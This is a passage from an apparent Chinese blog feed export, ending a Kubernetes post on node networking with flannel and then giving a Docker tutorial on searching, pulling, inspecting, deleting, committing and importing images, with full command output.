<p>Node 节点加入 master 不需要启动 kubelet。</p>
<p>在 master 节点查看所有加入的 node.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># kubectl get nodes</span></span><br><span class="line">NAME        STATUS     ROLES    AGE    VERSION</span><br><span class="line">hadoop02    NotReady   &lt;none&gt;   58m    v1.13.4</span><br><span class="line">hadoop03    NotReady   &lt;none&gt;   7s     v1.13.4</span><br><span class="line">localhost   NotReady   master   125m   v1.13.4</span><br></pre></td></tr></table></figure>
<p>所有的节点状态都为 NotReady，因为网络没有配置 OK,下面就来配置网络。</p>
<h1 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h1><p>kubectl apply -f <a href="https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml" target="_blank" rel="noopener">https://raw.githubusercontent.com/coreos/flannel/master/Documentation/kube-flannel.yml</a></p>
]]></content>
      <categories>
        <category>devops</category>
      </categories>
      <tags>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title>docker入门之镜像</title>
    <url>/2019/01/05/devops/docker%E5%85%A5%E9%97%A8%E4%B9%8B%E9%95%9C%E5%83%8F/</url>
    <content><![CDATA[<p>Docker 镜像是由文件系统叠加而成。最底端是一个文件引导系统，即 bootfs。Docker 用户不会与引导文件系统有直接的交互。Docker 镜像的第二层是 root 文件系统 rootfs，通常是一种或多种操作系统，例如 ubuntu 等。在 Docker 中，文件系统永远都是只读的，在每次修改时，都是进行拷贝叠加从而形成最终的文件系统。Docker 称这样的文件为镜像。一个镜像可以迭代在另一个镜像的顶部。位于下方的镜像称之为父镜像，最底层的镜像称之为基础镜像。最后，当从一个镜像启动容器时，Docker 会在最顶层加载一个读写文件系统作为容器。</p>
<a id="more"></a>
<p>其实上节已经介绍了部分的镜像操作的命令,本节继续介绍 docker 镜像相关的操作。</p>
<h1 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker search nginx</span><br></pre></td></tr></table></figure>
<p><img src="/2019/01/05/devops/docker入门之镜像/docker_search.png" alt></p>
<p>其中各字段信息为:</p>
<blockquote>
<ul>
<li>NAME:镜像仓库源的名称</li>
<li>DESCRIPTION:镜像的描述</li>
<li>STARS:表示评分</li>
<li>OFFICIAL:是否 docker 官方发布</li>
<li>AUTOMATED:是否自动创建。该类资源允许用户验证资源的来源和内容。</li>
</ul>
</blockquote>
<h1 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h1><p>可以使用 docker pull NAME[:TAG]命令从网络上下载镜像。如果不显式指定 TAG,默认会选择 latest 标签,即下载最新版本的镜像。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull nginx</span><br></pre></td></tr></table></figure>
<h2 id="查看镜像的详细信息"><a href="#查看镜像的详细信息" class="headerlink" title="查看镜像的详细信息"></a>查看镜像的详细信息</h2><p>用命令 docker images 查看所有安装的镜像信息,用 inspect IMAGE ID 查看详细信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bogon ~]<span class="comment"># docker images</span></span><br><span class="line"></span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">consul              latest              21c1d4ed11da        2 weeks ago         105MB</span><br><span class="line">erlang              latest              fd257b036a25        4 weeks ago         1.06GB</span><br><span class="line">rabbitmq            management          d69a5113ceae        2 months ago        149MB</span><br><span class="line">rabbitmq            latest              e8261c2af9fe        2 months ago        125MB</span><br></pre></td></tr></table></figure>
<p>其中各项信息含义为：</p>
<blockquote>
<ul>
<li>REPOSITORY,镜像的来源仓库信息</li>
<li>TAG,镜像的标签信息</li>
<li>IMAGE ID,镜像的 ID</li>
<li>CREATED,创建时间</li>
<li>SIZE,镜像大小</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@docker ~]<span class="comment"># docker inspect 7b2ec12a5042</span></span><br></pre></td></tr></table></figure>
<p>详细信息如下</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">"Id"</span>: <span class="string">"7b2ec12a50420a859b2731071494750a1040b4e9c76a43ea5cf9179712df5f2a"</span>,</span><br><span class="line">    <span class="attr">"Parent"</span>: <span class="string">"1ae58a018d101a53ff771cb30a37e01fe1e0f3ff34abe335178673d8c2135bda"</span>,</span><br><span class="line">    <span class="attr">"Comment"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"Created"</span>: <span class="string">"2018-07-24T17:21:51.548456912Z"</span>,</span><br><span class="line">    <span class="attr">"Container"</span>: <span class="string">"895e85f09f69727097e9c1783362736d7ee9b5b32f9eae1e5e32f2e1002abf14"</span>,</span><br><span class="line">    <span class="attr">"ContainerConfig"</span>: &#123;</span><br><span class="line">      <span class="attr">"Hostname"</span>: <span class="string">"895e85f09f69"</span>,</span><br><span class="line">      <span class="attr">"Domainname"</span>: <span class="string">""</span>,</span><br><span class="line">      <span class="attr">"User"</span>: <span class="string">""</span>,</span><br><span class="line">      <span class="attr">"AttachStdin"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"AttachStdout"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"AttachStderr"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"PortSpecs"</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">"ExposedPorts"</span>: &#123;</span><br><span class="line">        <span class="attr">"80/tcp"</span>: &#123;&#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"Tty"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"OpenStdin"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"StdinOnce"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"Env"</span>: [</span><br><span class="line">        <span class="string">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>,</span><br><span class="line">        <span class="string">"NGINX_VERSION=1.15.2-1~stretch"</span>,</span><br><span class="line">        <span class="string">"NJS_VERSION=1.15.2.0.2.2-1~stretch"</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">"Cmd"</span>: [</span><br><span class="line">        <span class="string">"/bin/sh"</span>,</span><br><span class="line">        <span class="string">"-c"</span>,</span><br><span class="line">        <span class="string">"#(nop) "</span>,</span><br><span class="line">        <span class="string">"CMD [\"nginx\" \"-g\" \"daemon off;\"]"</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">"Image"</span>: <span class="string">"sha256:f1eea4ec6bee804c269e8443513d7afe26adb1615518ad56d014973fd5faa5f3"</span>,</span><br><span class="line">      <span class="attr">"Volumes"</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">"VolumeDriver"</span>: <span class="string">""</span>,</span><br><span class="line">      <span class="attr">"WorkingDir"</span>: <span class="string">""</span>,</span><br><span class="line">      <span class="attr">"Entrypoint"</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">"NetworkDisabled"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"MacAddress"</span>: <span class="string">""</span>,</span><br><span class="line">      <span class="attr">"OnBuild"</span>: [],</span><br><span class="line">      <span class="attr">"Labels"</span>: &#123;</span><br><span class="line">        <span class="attr">"maintainer"</span>: <span class="string">"NGINX Docker Maintainers \u003cdocker-maint@nginx.com\u003e"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"DockerVersion"</span>: <span class="string">"17.06.2-ce"</span>,</span><br><span class="line">    <span class="attr">"Author"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"Config"</span>: &#123;</span><br><span class="line">      <span class="attr">"Hostname"</span>: <span class="string">""</span>,</span><br><span class="line">      <span class="attr">"Domainname"</span>: <span class="string">""</span>,</span><br><span class="line">      <span class="attr">"User"</span>: <span class="string">""</span>,</span><br><span class="line">      <span class="attr">"AttachStdin"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"AttachStdout"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"AttachStderr"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"PortSpecs"</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">"ExposedPorts"</span>: &#123;</span><br><span class="line">        <span class="attr">"80/tcp"</span>: &#123;&#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"Tty"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"OpenStdin"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"StdinOnce"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"Env"</span>: [</span><br><span class="line">        <span class="string">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>,</span><br><span class="line">        <span class="string">"NGINX_VERSION=1.15.2-1~stretch"</span>,</span><br><span class="line">        <span class="string">"NJS_VERSION=1.15.2.0.2.2-1~stretch"</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">"Cmd"</span>: [<span class="string">"nginx"</span>, <span class="string">"-g"</span>, <span class="string">"daemon off;"</span>],</span><br><span class="line">      <span class="attr">"Image"</span>: <span class="string">"sha256:f1eea4ec6bee804c269e8443513d7afe26adb1615518ad56d014973fd5faa5f3"</span>,</span><br><span class="line">      <span class="attr">"Volumes"</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">"VolumeDriver"</span>: <span class="string">""</span>,</span><br><span class="line">      <span class="attr">"WorkingDir"</span>: <span class="string">""</span>,</span><br><span class="line">      <span class="attr">"Entrypoint"</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">"NetworkDisabled"</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">"MacAddress"</span>: <span class="string">""</span>,</span><br><span class="line">      <span class="attr">"OnBuild"</span>: [],</span><br><span class="line">      <span class="attr">"Labels"</span>: &#123;</span><br><span class="line">        <span class="attr">"maintainer"</span>: <span class="string">"NGINX Docker Maintainers \u003cdocker-maint@nginx.com\u003e"</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"Architecture"</span>: <span class="string">"amd64"</span>,</span><br><span class="line">    <span class="attr">"Os"</span>: <span class="string">"linux"</span>,</span><br><span class="line">    <span class="attr">"Size"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"VirtualSize"</span>: <span class="number">108954999</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>默认会显示所有的镜像信息,可以加上-f 指定具体的字段信息。对应字段有一个.符号不能省略。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@bogon ~]<span class="comment"># docker inspect -f &#123;&#123;".VirtualSize"&#125;&#125; 7b2ec12a5042</span></span><br><span class="line">108954999</span><br></pre></td></tr></table></figure>
<h1 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h1><p>docker images 命令查看镜像 id,docker rmi IMAGE ID 来删除镜像。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi 3535063d9957</span><br></pre></td></tr></table></figure>
<p><img src="/2019/01/05/devops/docker入门之镜像/docker_rmi.png" alt></p>
<p>提示被容器使用,不能被删除。可以添加参数-f 来强制删除镜像，但是会有很多遗留问题，不建议。通常先删除容器再删除镜像。<br>查看正在运行的容器</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
<p><img src="/2019/01/05/devops/docker入门之镜像/docker_ps.png" alt></p>
<p>删除容器,用 docker rm CONTAINER ID 命令来删除容器,删除成功后返回 CONTAINER ID.</p>
<p><img src="/2019/01/05/devops/docker入门之镜像/docker_rm_id.png" alt></p>
<p>容器删除成功后，执行删除镜像命令,</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi IMAGE ID</span><br></pre></td></tr></table></figure>
<p><img src="/2019/01/05/devops/docker入门之镜像/docker_rmi_image.png" alt></p>
<h1 id="创建镜像"><a href="#创建镜像" class="headerlink" title="创建镜像"></a>创建镜像</h1><p>Docker 创建镜像的方式有三种,基于已有镜像的容器创建、基于本地模板导入、基于 Dockerfile 创建。</p>
<h2 id="基于已有镜像的容器创建"><a href="#基于已有镜像的容器创建" class="headerlink" title="基于已有镜像的容器创建"></a>基于已有镜像的容器创建</h2><p>主要是使用 docker commit 命令来创建镜像。基本语法 docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bogon ~]<span class="comment"># docker commit --help</span></span><br><span class="line"></span><br><span class="line">Usage:	docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]</span><br><span class="line"></span><br><span class="line">Create a new image from a container<span class="string">'s changes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Options:</span></span><br><span class="line"><span class="string">  -a, --author string    Author (e.g., "John Hannibal Smith &lt;hannibal@a-team.com&gt;")</span></span><br><span class="line"><span class="string">  -c, --change list      Apply Dockerfile instruction to the created image</span></span><br><span class="line"><span class="string">  -m, --message string   Commit message</span></span><br><span class="line"><span class="string">  -p, --pause            Pause container during commit (default true)</span></span><br></pre></td></tr></table></figure>
<p>-a, 指定作者信息;<br>-c, 指定改变列表;<br>-m, 指定注释信息;<br>-p, 提交过程中中断容器。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bogon ~]<span class="comment"># docker ps -a</span></span><br><span class="line">CONTAINER ID        IMAGE                 COMMAND                  CREATED             STATUS                     PORTS               NAMES</span><br><span class="line">ffff9fdbe1f2        consul                <span class="string">"docker-entrypoint.s…"</span>   4 hours ago         Exited (1) 4 hours ago                         node1</span><br><span class="line">c3a9f6d71ad2        rabbitmq:management   <span class="string">"docker-entrypoint.s…"</span>   3 weeks ago         Exited (0) 5 seconds ago                       rabbitmq</span><br><span class="line">[root@bogon ~]<span class="comment"># docker commit -a "xwolf" -m "test make docker images" c3a9f6d71ad2 testrabbitmq:1.0</span></span><br><span class="line">sha256:10f9580054c750668c804269857e0c85efe830dee43b75263337db994b168b27</span><br><span class="line">[root@bogon ~]<span class="comment"># docker images</span></span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">testrabbitmq        1.0                 10f9580054c7        5 seconds ago       149MB</span><br><span class="line">consul              latest              21c1d4ed11da        2 weeks ago         105MB</span><br><span class="line">erlang              latest              fd257b036a25        4 weeks ago         1.06GB</span><br><span class="line">rabbitmq            management          d69a5113ceae        2 months ago        149MB</span><br><span class="line">rabbitmq            latest              e8261c2af9fe        2 months ago        125MB</span><br><span class="line"></span><br><span class="line">[root@bogon ~]<span class="comment"># docker inspect 10f9580054c7</span></span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">"Id"</span>: <span class="string">"sha256:10f9580054c750668c804269857e0c85efe830dee43b75263337db994b168b27"</span>,</span><br><span class="line">        <span class="string">"RepoTags"</span>: [</span><br><span class="line">            <span class="string">"testrabbitmq:1.0"</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="string">"RepoDigests"</span>: [],</span><br><span class="line">        <span class="string">"Parent"</span>: <span class="string">"sha256:d69a5113ceae5e68ab483f780c1ad712c3932a35753f69e6462b32a9f320ad9c"</span>,</span><br><span class="line">        <span class="string">"Comment"</span>: <span class="string">"test make docker images"</span>,</span><br><span class="line">        <span class="string">"Created"</span>: <span class="string">"2019-01-05T19:47:59.660937054Z"</span>,</span><br><span class="line">        <span class="string">"Container"</span>: <span class="string">"c3a9f6d71ad22d14ec12e488a1917fbe59c7a6f18414402e3eac2418769c3fdf"</span>,</span><br><span class="line">        <span class="string">"ContainerConfig"</span>: &#123;</span><br><span class="line">            <span class="string">"Hostname"</span>: <span class="string">"c3a9f6d71ad2"</span>,</span><br><span class="line">            <span class="string">"Domainname"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="string">"User"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="string">"AttachStdin"</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="string">"AttachStdout"</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="string">"AttachStderr"</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="string">"ExposedPorts"</span>: &#123;</span><br><span class="line">                <span class="string">"15671/tcp"</span>: &#123;&#125;,</span><br><span class="line">                <span class="string">"15672/tcp"</span>: &#123;&#125;,</span><br><span class="line">                <span class="string">"25672/tcp"</span>: &#123;&#125;,</span><br><span class="line">                <span class="string">"4369/tcp"</span>: &#123;&#125;,</span><br><span class="line">                <span class="string">"5671/tcp"</span>: &#123;&#125;,</span><br><span class="line">                <span class="string">"5672/tcp"</span>: &#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">"Tty"</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="string">"OpenStdin"</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="string">"StdinOnce"</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="string">"Env"</span>: [</span><br><span class="line">                <span class="string">"PATH=/usr/lib/rabbitmq/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>,</span><br><span class="line">                <span class="string">"GOSU_VERSION=1.10"</span>,</span><br><span class="line">                <span class="string">"RABBITMQ_LOGS=-"</span>,</span><br><span class="line">                <span class="string">"RABBITMQ_SASL_LOGS=-"</span>,</span><br><span class="line">                <span class="string">"RABBITMQ_GPG_KEY=0A9AF2115F4687BD29803A206B73A36E6026DFCA"</span>,</span><br><span class="line">                <span class="string">"RABBITMQ_VERSION=3.7.8"</span>,</span><br><span class="line">                <span class="string">"RABBITMQ_GITHUB_TAG=v3.7.8"</span>,</span><br><span class="line">                <span class="string">"RABBITMQ_DEBIAN_VERSION=3.7.8-1"</span>,</span><br><span class="line">                <span class="string">"LANG=C.UTF-8"</span>,</span><br><span class="line">                <span class="string">"HOME=/var/lib/rabbitmq"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">"Cmd"</span>: [</span><br><span class="line">                <span class="string">"rabbitmq-server"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">"ArgsEscaped"</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="string">"Image"</span>: <span class="string">"rabbitmq:management"</span>,</span><br><span class="line">            <span class="string">"Volumes"</span>: &#123;</span><br><span class="line">                <span class="string">"/var/lib/rabbitmq"</span>: &#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">"WorkingDir"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="string">"Entrypoint"</span>: [</span><br><span class="line">                <span class="string">"docker-entrypoint.sh"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">"OnBuild"</span>: null,</span><br><span class="line">            <span class="string">"Labels"</span>: &#123;&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">"DockerVersion"</span>: <span class="string">"18.09.1-rc1"</span>,</span><br><span class="line">        <span class="string">"Author"</span>: <span class="string">"xwolf"</span>,</span><br><span class="line">        <span class="string">"Config"</span>: &#123;</span><br><span class="line">            <span class="string">"Hostname"</span>: <span class="string">"c3a9f6d71ad2"</span>,</span><br><span class="line">            <span class="string">"Domainname"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="string">"User"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="string">"AttachStdin"</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="string">"AttachStdout"</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="string">"AttachStderr"</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="string">"ExposedPorts"</span>: &#123;</span><br><span class="line">                <span class="string">"15671/tcp"</span>: &#123;&#125;,</span><br><span class="line">                <span class="string">"15672/tcp"</span>: &#123;&#125;,</span><br><span class="line">                <span class="string">"25672/tcp"</span>: &#123;&#125;,</span><br><span class="line">                <span class="string">"4369/tcp"</span>: &#123;&#125;,</span><br><span class="line">                <span class="string">"5671/tcp"</span>: &#123;&#125;,</span><br><span class="line">                <span class="string">"5672/tcp"</span>: &#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">"Tty"</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="string">"OpenStdin"</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="string">"StdinOnce"</span>: <span class="literal">false</span>,</span><br><span class="line">            <span class="string">"Env"</span>: [</span><br><span class="line">                <span class="string">"PATH=/usr/lib/rabbitmq/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>,</span><br><span class="line">                <span class="string">"GOSU_VERSION=1.10"</span>,</span><br><span class="line">                <span class="string">"RABBITMQ_LOGS=-"</span>,</span><br><span class="line">                <span class="string">"RABBITMQ_SASL_LOGS=-"</span>,</span><br><span class="line">                <span class="string">"RABBITMQ_GPG_KEY=0A9AF2115F4687BD29803A206B73A36E6026DFCA"</span>,</span><br><span class="line">                <span class="string">"RABBITMQ_VERSION=3.7.8"</span>,</span><br><span class="line">                <span class="string">"RABBITMQ_GITHUB_TAG=v3.7.8"</span>,</span><br><span class="line">                <span class="string">"RABBITMQ_DEBIAN_VERSION=3.7.8-1"</span>,</span><br><span class="line">                <span class="string">"LANG=C.UTF-8"</span>,</span><br><span class="line">                <span class="string">"HOME=/var/lib/rabbitmq"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">"Cmd"</span>: [</span><br><span class="line">                <span class="string">"rabbitmq-server"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">"ArgsEscaped"</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="string">"Image"</span>: <span class="string">"rabbitmq:management"</span>,</span><br><span class="line">            <span class="string">"Volumes"</span>: &#123;</span><br><span class="line">                <span class="string">"/var/lib/rabbitmq"</span>: &#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">"WorkingDir"</span>: <span class="string">""</span>,</span><br><span class="line">            <span class="string">"Entrypoint"</span>: [</span><br><span class="line">                <span class="string">"docker-entrypoint.sh"</span></span><br><span class="line">            ],</span><br><span class="line">            <span class="string">"OnBuild"</span>: null,</span><br><span class="line">            <span class="string">"Labels"</span>: &#123;&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">"Architecture"</span>: <span class="string">"amd64"</span>,</span><br><span class="line">        <span class="string">"Os"</span>: <span class="string">"linux"</span>,</span><br><span class="line">        <span class="string">"Size"</span>: 149005125,</span><br><span class="line">        <span class="string">"VirtualSize"</span>: 149005125,</span><br><span class="line">        <span class="string">"GraphDriver"</span>: &#123;</span><br><span class="line">            <span class="string">"Data"</span>: &#123;</span><br><span class="line">                <span class="string">"LowerDir"</span>: <span class="string">"/var/lib/docker/overlay2/811b15f8872db9fdfbaf99c95f079a789a8d4802183879f63b6e9bbbb42683da/diff:/var/lib/docker/overlay2/591be8ad69e775d4a1a657fd95cf720b1ae08952ec1d6b3a5a4468e3e97af075/diff:/var/lib/docker/overlay2/9500494e826a223f1fdaf7f1111eba95a5de63daf838ab086856c7961554089b/diff:/var/lib/docker/overlay2/bbb241d9364f497218895e2193d7fb48ce809932000707c02e39f911099f896b/diff:/var/lib/docker/overlay2/b1231c320113693ffcd52d340975a0615ab55a1ce4b8ae9c2f2397587bc82ae1/diff:/var/lib/docker/overlay2/70722cbaba64480fbeebf6c829fdc35ddeffe8c693fc79590676448a4590de99/diff:/var/lib/docker/overlay2/a2c7ab007ca743b9f3e1ff01b485cc238cabc2a16b54ead94cfcc5125c995275/diff:/var/lib/docker/overlay2/0425a71599e4d9319cb027e1973887f94ab225a79ac1a1e7556eb39cc223122a/diff:/var/lib/docker/overlay2/4f46781c5e2d06ca1cc6af2569f4b211b3e7251f100a2711c1fba5f2b71c68b6/diff:/var/lib/docker/overlay2/53154bc70cb837da13d85fe45d56942ad7a8428c4da28aa7091ee08ab9e010d1/diff:/var/lib/docker/overlay2/6ae1115c34ab53b07b8ab67b9b8f3586bad3d9bb0e08eba8168d0e8c50157965/diff:/var/lib/docker/overlay2/42cabbb74e6f925684a37f777357fb58acb8aeb06b7cbe237a948dd9ee1980b0/diff:/var/lib/docker/overlay2/c836245b682b2e2fe184b3b50b91761d4a24cdae436a23da9aca3630ec66232e/diff:/var/lib/docker/overlay2/c413d51ccda1b0a9b9362363cdcfa9657cd50ef98e7675cdfea0abf534ceae9b/diff"</span>,</span><br><span class="line">                <span class="string">"MergedDir"</span>: <span class="string">"/var/lib/docker/overlay2/34f4cfb89aa9478067b1bcf994c0e8cfd625c9113745f18d458875f420f1df9e/merged"</span>,</span><br><span class="line">                <span class="string">"UpperDir"</span>: <span class="string">"/var/lib/docker/overlay2/34f4cfb89aa9478067b1bcf994c0e8cfd625c9113745f18d458875f420f1df9e/diff"</span>,</span><br><span class="line">                <span class="string">"WorkDir"</span>: <span class="string">"/var/lib/docker/overlay2/34f4cfb89aa9478067b1bcf994c0e8cfd625c9113745f18d458875f420f1df9e/work"</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">"Name"</span>: <span class="string">"overlay2"</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">"RootFS"</span>: &#123;</span><br><span class="line">            <span class="string">"Type"</span>: <span class="string">"layers"</span>,</span><br><span class="line">            <span class="string">"Layers"</span>: [</span><br><span class="line">                <span class="string">"sha256:237472299760d6726d376385edd9e79c310fe91d794bc9870d038417d448c2d5"</span>,</span><br><span class="line">                <span class="string">"sha256:9ce2f4becd217f5b787bc6fc93cea756860d7f0c025c8b0da5289eb5dd2d9791"</span>,</span><br><span class="line">                <span class="string">"sha256:e6508aa518e57bf272703c5245478a9ece3eff4e4cd9d62bba43f2469437b092"</span>,</span><br><span class="line">                <span class="string">"sha256:1a40011024642e11ad451725ee8936b6678fe70bad7b4322f5e74d19cefcf618"</span>,</span><br><span class="line">                <span class="string">"sha256:a59b527680e8b7002d9d94a762f04336bdd0d83741ed712b9124b8694f7f164a"</span>,</span><br><span class="line">                <span class="string">"sha256:0c2a7c5ad55428818ae62be5858d11be38a9c1cc3a0cf2d54b44d34eaf2c74c8"</span>,</span><br><span class="line">                <span class="string">"sha256:3f0c7b29a0e01a0837d6d69c968caa239eb3069bc19bcee05ed9359ec493c17f"</span>,</span><br><span class="line">                <span class="string">"sha256:f836c753fbcf607f36c198650aec2c96fefc8de8f9231ffc5cb2ff0d2fcbd38f"</span>,</span><br><span class="line">                <span class="string">"sha256:18305be5f19def5d5a98ee9b3161691eafcac3dc1642fc8c65725606b365fb8c"</span>,</span><br><span class="line">                <span class="string">"sha256:873e9b3484d07246f9746aa142132b217f62ac1fb2ff133ae9985d89316c9382"</span>,</span><br><span class="line">                <span class="string">"sha256:605ab53ecae3ff2cd3f4633940918a58c0450542ac0973cafa4faf5a7f18ba0b"</span>,</span><br><span class="line">                <span class="string">"sha256:8b84056bae1b7a7dd7b91ceeb279047e75f80e1ea77dfc74fd8ff8599867b6dd"</span>,</span><br><span class="line">                <span class="string">"sha256:327e9aa33c61766c3cd2062caad462f03433fd90b2bb9488b72aca07f5e6566f"</span>,</span><br><span class="line">                <span class="string">"sha256:2f34184930dd172ed432f10fd75d2417093c300273d27aa133b771a77ab91a05"</span>,</span><br><span class="line">                <span class="string">"sha256:edc8c8220a3358abcf0f81fa025549b98a79933f8b656a9d6c0b15886ed86460"</span></span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">"Metadata"</span>: &#123;</span><br><span class="line">            <span class="string">"LastTagTime"</span>: <span class="string">"2019-01-06T03:47:59.677227504+08:00"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">[root@bogon ~]<span class="comment"># docker inspect 10f9580054c7 -f &#123;&#123;".Author"&#125;&#125;</span></span><br><span class="line">xwolf</span><br><span class="line">[root@bogon ~]<span class="comment"># docker inspect 10f9580054c7 -f &#123;&#123;".Comment"&#125;&#125;</span></span><br><span class="line"><span class="built_in">test</span> make docker images</span><br></pre></td></tr></table></figure>
<h2 id="基于本地模板导入"><a href="#基于本地模板导入" class="headerlink" title="基于本地模板导入"></a>基于本地模板导入</h2><p>首先到 <a href="https://openvz.org/" target="_blank" rel="noopener">https://openvz.org/</a> 下载模板，这里我们仅仅是演示一下怎么导入模板就下载一个比较小的文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bogon ~]<span class="comment"># wget https://download.openvz.org/template/precreated/ubuntu-12.04-x86_64-minimal.tar.gz</span></span><br></pre></td></tr></table></figure>
<p>下载完成后执行下面 docker import 命令导入镜像。</p>
